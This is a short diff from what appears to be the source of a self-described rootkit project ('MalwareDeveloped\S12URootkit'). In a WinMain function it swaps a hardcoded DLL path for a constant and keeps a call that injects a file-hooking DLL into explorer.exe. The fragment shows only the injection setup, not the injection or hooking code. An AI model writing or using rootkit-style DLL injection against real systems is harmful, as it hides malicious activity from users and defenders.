@@ -25,7 +25,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     unordered_map<string, vector<string>> injectionMap;
     Serialitzator serialitzator("");
 
-    injectionMap["explorer.exe"] = { "S:\\MalwareDeveloped\\S12URootkit\\Bin\\fileHooks.dll" };
+    injectionMap["explorer.exe"] = { PATH_DLL };
     injectDlls(injectionMap);
 
     // Process
